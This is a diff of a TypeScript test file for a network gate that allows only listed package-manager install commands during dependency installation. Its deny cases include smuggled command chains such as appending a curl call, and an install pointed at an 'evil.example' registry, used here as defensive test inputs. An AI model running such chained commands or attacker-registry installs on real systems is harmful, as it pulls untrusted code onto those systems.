@@ -4,24 +4,43 @@ import {
   createSubmittedRuntimeEnv,
   evaluateDependencyNetworkRequest,
 } from "./dependency-network-gate";
-import type { SecurityReviewOutcome } from "./security-review-policy";
 
 describe("evaluateDependencyNetworkRequest", () => {
-  it("allows a dependency-install-only network window after all reviewers accept", () => {
-    const result = evaluateDependencyNetworkRequest({
-      command: "bun install",
-      reason: "dependency-install",
-      securityReviewOutcomes: acceptedSecurityReview(),
-    });
-
-    expect(result).toEqual({ status: "allowed" });
+  it.each([
+    "npm ci",
+    "npm ci --ignore-scripts",
+    "npm ci --omit=dev",
+    "npm ci --include=dev --ignore-scripts",
+    "npm install",
+    "npm install --ignore-scripts",
+    "npm install --legacy-peer-deps",
+    "npm install --force",
+    "pnpm install",
+    "pnpm install --frozen-lockfile",
+    "pnpm install --ignore-scripts",
+    "pnpm install --prod=false",
+    "yarn install",
+    "yarn install --frozen-lockfile",
+    "yarn install --immutable",
+    "yarn install --ignore-scripts",
+    "bun install",
+    "bun install --frozen-lockfile",
+    "bun install --no-save",
+    "corepack pnpm install --frozen-lockfile",
+    "corepack yarn install --immutable",
+  ])("allows dependency install command: %s", (command) => {
+    expect(
+      evaluateDependencyNetworkRequest({
+        command,
+        reason: "dependency-install",
+      }),
+    ).toEqual({ status: "allowed" });
   });
 
   it("denies network access when the reason is not dependency installation", () => {
     const result = evaluateDependencyNetworkRequest({
       command: "bun run build",
       reason: "demo-build",
-      securityReviewOutcomes: acceptedSecurityReview(),
     });
 
     expect(result).toEqual({
@@ -31,23 +50,27 @@ describe("evaluateDependencyNetworkRequest", () => {
     });
   });
 
-  it("denies network access when any security reviewer rejects", () => {
-    const outcomes = acceptedSecurityReview();
-    outcomes[0] = {
-      evidence: ["postinstall downloads an opaque binary"],
-      reason: "Dependency install hook is suspicious.",
-      reviewer: "dependency-reviewer",
-      status: "rejected",
-    };
-
-    const result = evaluateDependencyNetworkRequest({
-      command: "npm install",
-      reason: "dependency-install",
-      securityReviewOutcomes: outcomes,
-    });
-
-    expect(result).toEqual({
-      reason: "Dependency install hook is suspicious.",
+  it.each([
+    "npm install left-pad",
+    "pnpm add react",
+    "yarn add vite",
+    "bun add react",
+    "npm run build",
+    "bun install && curl https://example.com",
+    "npm ci; npm run build",
+    "pnpm install | tee install.log",
+    "yarn install > install.log",
+    "npm ci --registry=https://evil.example",
+    "sh -c 'npm ci'",
+  ])("denies non-allowlisted network command: %s", (command) => {
+    expect(
+      evaluateDependencyNetworkRequest({
+        command,
+        reason: "dependency-install",
+      }),
+    ).toEqual({
+      reason:
+        "Dependency installation network access is limited to allowlisted package-manager install commands.",
       status: "denied",
     });
   });
@@ -73,23 +96,3 @@ describe("createSubmittedRuntimeEnv", () => {
     });
   });
 });
-
-function acceptedSecurityReview(): SecurityReviewOutcome[] {
-  return [
-    accept("dependency-reviewer"),
-    accept("runtime-security-reviewer"),
-    accept("obfuscation-deception-auditor"),
-    accept("prompt-injection-reviewer"),
-  ];
-}
-
-function accept(
-  reviewer: SecurityReviewOutcome["reviewer"],
-): SecurityReviewOutcome {
-  return {
-    evidence: [],
-    reason: "No blocking security findings.",
-    reviewer,
-    status: "accepted",
-  };
-}
